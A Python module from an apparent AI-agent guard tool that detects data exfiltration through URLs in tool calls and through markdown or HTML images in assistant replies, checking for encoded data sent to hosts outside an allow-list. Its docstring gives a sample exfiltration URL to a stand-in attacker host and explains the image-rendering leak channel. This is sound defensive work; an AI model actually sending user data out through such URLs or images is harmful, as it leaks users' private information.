"""Data exfiltration through URLs: tool calls that fetch a URL and images in assistant text.

Data can leave without any upload: a GET to `https://attacker.example/?d=<encoded data>` (via
WebFetch, an MCP tool or `curl`) or an image in a response that the client renders and so
fetches. A URL is flagged when its host is not in `data_exfiltration.allowed_hosts` and it
carries data:

- a base64 or hex run in the path, query or fragment that decodes to readable text (high);
- a long query string (warn only: search and tracking URLs are long too).

Inspected segments:
- tool call inputs, except file paths and file contents: every URL in a command, and every
  field whose value is a URL (WebFetch `url`, MCP tool arguments);
- assistant text (responses, and assistant turns in Stop transcripts): markdown images and
  HTML `<img>` tags. Links are not flagged, since they need a click.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import urlsplit

from claude_guard.config import Policy
from claude_guard.detectors.base import build_finding, host_matches
from claude_guard.detectors.commands import CONTENT_FIELDS, PATH_FIELDS
from claude_guard.detectors.obfuscation import decoded_candidates
from claude_guard.models import Category, Finding, InspectionContext, Severity, TextSegment

LONG_QUERY_LENGTH = 300
ENCODED_DATA_CONFIDENCE = 0.8
LONG_QUERY_CONFIDENCE = 0.5

_URL = re.compile(r"https?://[^\s\"'`<>|;)\]]+", re.IGNORECASE)
# URL components are decoded one by one: a leading "/" or "=" would shift base64 alignment.
_QUERY_SEPARATORS = re.compile(r"[?#&=]")
_ALL_SEPARATORS = re.compile(r"[/?#&=.]")
_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^\s)>]+)", re.IGNORECASE)
_HTML_IMAGE = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*[\"']?(https?://[^\s\"'>]+)", re.IGNORECASE)


@dataclass(frozen=True)
class UrlSignal:
    host: str
    description: str
    severity: Severity
    confidence: float


def url_signal(url: str, allowed_hosts: frozenset[str]) -> UrlSignal | None:
    """Why `url` looks like it carries data to a non-allowed host, or None."""
    try:
        parts = urlsplit(url)
        host = (parts.hostname or "").lower()
    except ValueError:
        return None
    if not host or any(host_matches(host, allowed) for allowed in allowed_hosts):
        return None

    carried = f"{parts.path}?{parts.query}#{parts.fragment}"
    # Standard base64 may contain "/", so try whole query values as well as path segments.
    pieces = {*_QUERY_SEPARATORS.split(carried), *_ALL_SEPARATORS.split(carried)}
    for piece in sorted(pieces, key=len, reverse=True):
        for decoded in decoded_candidates(piece, encodings=("base64", "hex")):
            return UrlSignal(
                host,
                f"{decoded.encoding}-encoded data ({decoded.end - decoded.start} chars)",
                Severity.HIGH,
                ENCODED_DATA_CONFIDENCE,
            )
    if len(parts.query) > LONG_QUERY_LENGTH:
        return UrlSignal(
            host,
            f"long query string ({len(parts.query)} chars)",
            Severity.MEDIUM,
            LONG_QUERY_CONFIDENCE,
        )
    return None


class ExfiltrationDetector:
    """Flags URLs that carry encoded data to hosts outside `allowed_hosts`."""

    name = "exfiltration"

    def __init__(self, policy: Policy) -> None:
        self._policy = policy.data_exfiltration
        self._allowed_hosts = frozenset(host.lower() for host in self._policy.allowed_hosts)

    async def detect(self, ctx: InspectionContext) -> list[Finding]:
        findings: list[Finding] = []
        for segment in ctx.segments:
            for rule, kind, url in self._urls(segment):
                signal = url_signal(url, self._allowed_hosts)
                if signal is None:
                    continue
                finding = build_finding(
                    detector=self.name,
                    category=Category.DATA_EXFILTRATION,
                    policy=self._policy,
                    direction=ctx.direction,
                    rule=rule,
                    message=f"{kind} sends {signal.description} to {signal.host}",
                    severity=signal.severity,
                    confidence=signal.confidence,
                    segment=segment,
                    # The URL itself may hold the exfiltrated data: report its host only.
                    excerpt=f"{signal.host}: {signal.description}",
                )
                if finding:
                    findings.append(finding)
        return findings

    @staticmethod
    def _urls(segment: TextSegment) -> list[tuple[str, str, str]]:
        """(rule, what, url) for every URL worth checking in `segment`."""
        if segment.tool_name is not None:
            if segment.tool_field in PATH_FIELDS or segment.tool_field in CONTENT_FIELDS:
                return []
            kind = f"{segment.tool_name}.{segment.tool_field} URL"
            return [("url_exfiltration", kind, url) for url in _URL.findall(segment.text)]
        if segment.role == "assistant":
            images = _MARKDOWN_IMAGE.findall(segment.text) + _HTML_IMAGE.findall(segment.text)
            return [("image_exfiltration", "Image URL", url) for url in images]
        return []
